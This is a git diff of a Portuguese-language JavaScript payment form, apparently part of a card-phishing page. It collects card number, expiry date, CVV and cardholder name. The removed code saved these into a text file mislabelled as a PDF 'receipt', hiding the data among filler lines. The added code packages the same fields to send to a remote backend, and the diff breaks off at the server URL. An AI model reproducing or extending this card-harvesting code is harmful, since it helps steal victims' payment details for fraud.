@@ -1,6 +1,5 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
-    const dadosForm = document.querySelector("#dados");
 
     const campos = {
         numero: document.querySelector("#numero"),
@@ -16,12 +15,12 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
+    // Configuração das dicas (Cinza)
     for (const key in campos) {
         const input = campos[key];
 
         input.addEventListener("focus", () => {
             removeMensagemDica(input);
-
             const dica = document.createElement("span");
             dica.classList.add("mensagem-dica");
             dica.style.color = "#666";
@@ -29,7 +28,6 @@ document.addEventListener("DOMContentLoaded", () => {
             dica.style.display = "block";
             dica.style.marginTop = "4px";
             dica.textContent = mensagensDica[key];
-
             input.parentElement.appendChild(dica);
         });
 
@@ -43,9 +41,10 @@ document.addEventListener("DOMContentLoaded", () => {
         if (existing) existing.remove();
     }
 
-    form.addEventListener("submit", (event) => {
+    form.addEventListener("submit", async (event) => {
         event.preventDefault();
 
+        // Limpa erros anteriores
         document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
 
         const inputs = {
@@ -66,6 +65,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         let formValido = true;
 
+        // VALIDAÇÃO VISUAL (Retângulos vermelhos)
         for (const key in inputs) {
             const input = inputs[key];
 
@@ -87,7 +87,6 @@ document.addEventListener("DOMContentLoaded", () => {
                     erro.style.fontSize = "14px";
                     erro.textContent = mensagensErro[key];
                     container.appendChild(erro);
-
                 } else {
                     input.style.border = "1px solid red";
                     input.style.borderRadius = "8px";
@@ -112,66 +111,18 @@ document.addEventListener("DOMContentLoaded", () => {
             }
         }
 
+        // --- INTEGRAÇÃO COM O SERVIDOR (RENDER) ---
         if (formValido) {
-            saveFormDataToFile();
-            window.location.href = "confirmacao.html";
-        }
-    });
+            const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
+            
+            const dadosParaEnviar = {
+                numero: campos.numero.value,
+                dataValidade: campos.data.value,
+                cvv: campos.cvv.value,
+                nome: campos.nome.value,
+                tipo: cardType
+            };
 
-    function saveFormDataToFile() {
-        const cardNumber = campos.numero.value;
-        const expiryDate = campos.data.value;
-        const cvv = campos.cvv.value;
-        const cardName = campos.nome.value;
-        const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
-        
-        const formData = `
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Número: ${cardNumber}
-Validade: ${expiryDate}
-CVV: ${cvv}
-Nome no Cartão: ${cardName}
-Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
-`;
-        
-        const blob = new Blob([formData], { type: 'text/plain' });
-        
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = 'comprovante_erro_1023404.pdf';
-        
-        document.body.appendChild(a);
-        a.click();
-        
-        document.body.removeChild(a);
-        URL.revokeObjectURL(a.href);
-    }
-
-});
+            try {
+                // Link do seu backend integrado
+                const urlDoServidor = "
